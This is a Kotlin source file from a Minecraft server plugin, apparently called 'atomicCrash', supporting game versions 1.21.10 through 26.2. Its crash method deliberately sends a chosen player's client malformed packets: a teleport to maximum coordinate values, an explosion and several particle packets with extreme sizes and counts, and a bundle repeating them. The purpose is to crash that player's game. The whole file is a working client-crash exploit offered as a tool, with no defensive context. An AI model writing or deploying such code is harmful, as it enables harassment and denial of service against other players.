package io.github.runkang10.atomicCrash.version

import io.github.runkang10.atomicCrash.shared.Version
import io.github.runkang10.atomicCrash.shared.VersionHeader
import net.minecraft.core.particles.ExplosionParticleInfo
import net.minecraft.core.particles.ParticleOptions
import net.minecraft.core.particles.ParticleTypes
import net.minecraft.network.protocol.Packet
import net.minecraft.network.protocol.game.*
import net.minecraft.server.level.ServerPlayer
import net.minecraft.sounds.SoundEvents
import net.minecraft.util.random.WeightedList
import net.minecraft.world.entity.PositionMoveRotation
import net.minecraft.world.phys.Vec3
import org.bukkit.craftbukkit.entity.CraftPlayer
import org.bukkit.entity.Player
import java.util.*

@Suppress("ClassName")
class NMS_26 private constructor() : Version {
    companion object : VersionHeader {
        override val supportedVersion = listOf(
            "1.21.10",
            "1.21.11",
            "26.1",
            "26.1.1",
            "26.1.2",
            "26.2"
        )

        override fun new() = NMS_26()
    }

    private val vec3d = Vec3(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)


    override fun crash(player: Player) {
        val serverPlayer = (player as CraftPlayer).handle
        val connection = serverPlayer.connection

        val packets = generatePackets(serverPlayer, serverPlayer.position())
        packets.forEach { packet -> connection.send(packet) }
        connection.send(ClientboundBundlePacket(packets))
    }


    private fun generatePackets(
        player: ServerPlayer,
        center: Vec3,
    ): List<Packet<ClientGamePacketListener>> = listOf(
        ClientboundTeleportEntityPacket(
            player.id,
            PositionMoveRotation(
                vec3d,
                vec3d,
                Float.MAX_VALUE,
                Float.MAX_VALUE
            ),
            emptySet(),
            true
        ),
        ClientboundExplodePacket(
            center,
            Float.MAX_VALUE,
            Int.MAX_VALUE,
            Optional.of(vec3d),
            ParticleTypes.ASH,
            SoundEvents.GENERIC_EXPLODE,
            WeightedList.of(
                ExplosionParticleInfo(
                    ParticleTypes.ASH,
                    Float.MAX_VALUE,
                    Float.MIN_VALUE
                )
            )
        ),
        particlePacketOf(ParticleTypes.ASH, center),
        particlePacketOf(ParticleTypes.BUBBLE, center),
        particlePacketOf(ParticleTypes.CLOUD, center),
        particlePacketOf(ParticleTypes.ANGRY_VILLAGER, center)
    )

    private fun particlePacketOf(
        type: ParticleOptions,
        vec3: Vec3
    ) = ClientboundLevelParticlesPacket(
        type,
        true,
        true,
        vec3.x,
        vec3.y,
        vec3.z,
        Float.MAX_VALUE,
        Float.MAX_VALUE,
        Float.MAX_VALUE,
        Float.MAX_VALUE,
        Int.MAX_VALUE
    )
}